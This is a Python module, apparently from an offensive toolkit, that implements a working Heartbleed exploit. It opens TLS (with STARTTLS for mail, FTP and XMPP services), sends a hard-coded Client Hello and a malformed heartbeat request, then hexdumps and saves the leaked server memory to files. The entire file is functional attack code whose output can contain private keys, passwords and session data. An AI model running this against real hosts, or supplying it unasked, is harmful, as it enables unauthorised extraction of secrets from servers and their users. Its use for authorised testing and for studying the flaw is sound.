from modules.utils import colored
import urllib.parse, socket, select, struct, time, os


__doc__ = "Single class module to exploit the heartbleed bug on affected hosts ..."

class Heartbleed(object):
    def __init__(self, target, timeout: int = 8, dump_dir: str = "", quiet: bool = True):
        url = urllib.parse.urlsplit(target if "://" in target else f"https://{target}/")
        self.protocol = url.scheme
        self.host = url.hostname
        self.port = url.port or socket.getservbyname(self.protocol)
        self.timeout = timeout
        self.dump_dir = dump_dir
        self.quiet = True
        self.vulnerable = self.check()
        self.quiet = quiet

    def __repr__(self):
        return f"Heartbleed(protocol={repr(self.protocol)}, host={repr(self.host)}, port={self.port}, vulnerable={self.vulnerable})"
    
    def print(self, *args, **kwargs):
        if not self.quiet:
            print(*args, **kwargs)
    
    def hexdump(self, data):
        for b in range(0, len(data), 16):
            try:
                line = [char for char in data[b: b + 16]]
                self.print(colored(" -  {:04x}: {:48} {}".format(b, " ".join(f"{char:02x}" for char in line), "".join((chr(char) if 32 <= char <= 126 else ".") for char in line)), dark=True))
            except KeyboardInterrupt:
                self.print(colored("[!] Keyboard Interrupted! (Ctrl+C Pressed)", "red"))
                break
        self.print("")
    
    def recvall(self, length, timeout=8):
        endtime = time.time() + timeout
        rdata = b""
        remain = length
        while remain > 0:
            if endtime - time.time() < 0:
                raise socket.timeout("Reading socket data took too long ...")
            if self.socket in select.select([self.socket], [], [], 5)[0]:
                data = self.socket.recv(remain)
                if not data:
                    raise Exception("No data received ...")
                rdata += data
                remain -= len(data)
        return rdata
    
    def recvmsg(self):
        hdr = self.recvall(5)
        if hdr is None:
            self.print(colored("[!] Unexpected EOF receiving record header: Server closed connection!", "red"))
            return None, None, None
        type, version, ln = struct.unpack(">BHH", hdr)
        payload = self.recvall(ln, 10)
        if payload is None:
            self.print(colored("[!] Unexpected EOF receiving record payload: Server closed connection!", "red"))
            return None, None, None
        self.print(colored(f"... Received message: type = {type}, ver = {version:04x}, length = {len(payload)}", dark=True))
        return type, version, payload
    
    def dump(self, length: int = 0xFFF):
        data = self.recvall(length, 10)
        if data and len(data) > 5:
            data = data[5:]
        return data
    
    def hit_hb(self):
        self.socket.send(b'\x18\x03\x02\x00\x03\x01@\x00')
        while True:
            type, version, payload = self.recvmsg()
            if type is None:
                self.print(colored("[!] No heartbeat response received, server likely not vulnerable.", "red"))
                return False
            elif type == 21:
                self.print(colored("[i] Received alert:"))
                if not self.quiet: self.hexdump(payload)
                self.print(colored("[!] Server returned error, likely not vulnerable.", "red"))
                return False
            elif type == 24:
                self.print(colored("[i] Received heartbeat response:"))
                if not self.quiet: self.hexdump(payload)
                if len(payload) > 3:
                    self.print(colored("[i] WARNING: server returned more data than it should - server is vulnerable!", "yellow"))
                    if self.dump_dir:
                        filename = os.path.join(self.dump_dir, f"{self.protocol}-{self.host}-{self.port}.bin")
                        file = open(filename, "ab")
                        file.write(payload)
                        file.close()
                        print(colored(f"[i] Data successfully saved on {repr(filename)}!"))
                else:
                    self.print(colored("[i] Server processed malformed heartbeat, but did not return any extra data."))
                return True
    
    def starttls(self):
        if self.protocol != "https":
            self.print(colored("[i] Sending STARTTLS Protocol Command ..."))
        
        if self.protocol == "smtp":
            self.socket.recv(0x400)
            self.socket.send(b"EHLO openssl.client.net\n")
            self.socket.recv(0x400)
            self.socket.send(b"STARTTLS\n")
            self.socket.recv(0x400)
        elif self.protocol == "pop3":
            self.socket.recv(0x400)
            self.socket.send(b"STLS\n")
            self.socket.recv(0x400)
        elif self.protocol == "imap":
            self.socket.recv(0x400)
            self.socket.send(b"STARTTLS\n")
            self.socket.recv(0x400)
        elif self.protocol == "ftp":
            self.socket.recv(0x400)
            self.socket.send(b"AUTH TLS\n")
            self.socket.recv(0x400)
        elif self.protocol == "xmpp": # TODO: This needs SASL
            self.socket.send(b"<stream:stream xmlns:stream='http://etherx.jabber.org/streams' xmlns='jabber:client' to='%s' version='1.0'\n")
            self.socket.recv(0x400)
    
    def check(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.settimeout(self.timeout)
        self.print(colored(f"[i] Connecting to {self.host}:{self.port} ..."))
        self.socket.connect((self.host, self.port))
        
        self.starttls()
        self.print(colored("[i] Sending Client Hello ..."))
        self.socket.send(b'\x16\x03\x02\x00\xdc\x01\x00\x00\xd8\x03\x02SC[\x90\x9d\x9br\x0b\xbc\x0c\xbc+\x92\xa8H\x97\xcf\xbd9\x04\xcc\x16\n\x85\x03\x90\x9fw\x043\xd4\xde\x00\x00f\xc0\x14\xc0\n\xc0"\xc0!\x009\x008\x00\x88\x00\x87\xc0\x0f\xc0\x05\x005\x00\x84\xc0\x12\xc0\x08\xc0\x1c\xc0\x1b\x00\x16\x00\x13\xc0\r\xc0\x03\x00\n\xc0\x13\xc0\t\xc0\x1f\xc0\x1e\x003\x002\x00\x9a\x00\x99\x00E\x00D\xc0\x0e\xc0\x04\x00/\x00\x96\x00A\xc0\x11\xc0\x07\xc0\x0c\xc0\x02\x00\x05\x00\x04\x00\x15\x00\x12\x00\t\x00\x14\x00\x11\x00\x08\x00\x06\x00\x03\x00\xff\x01\x00\x00I\x00\x0b\x00\x04\x03\x00\x01\x02\x00\n\x004\x002\x00\x0e\x00\r\x00\x19\x00\x0b\x00\x0c\x00\x18\x00\t\x00\n\x00\x16\x00\x17\x00\x08\x00\x06\x00\x07\x00\x14\x00\x15\x00\x04\x00\x05\x00\x12\x00\x13\x00\x01\x00\x02\x00\x03\x00\x0f\x00\x10\x00\x11\x00#\x00\x00\x00\x0f\x00\x01\x01')
        self.print(colored("[i] Waiting for Server Hello ..."))
        
        while True:
            type, version, payload = self.recvmsg()
            if type == None:
                self.print(colored("[!] Server closed connection without sending Server Hello.", "red"))
                return False
            # Look for server hello done message.
            if type == 22 and payload[0] == 0x0E:
                break
        
        self.print(colored("[i] Sending heartbeat request ..."))
        self.socket.send(b'\x18\x03\x02\x00\x03\x01@\x00')
        vuln = self.hit_hb()
        return vuln
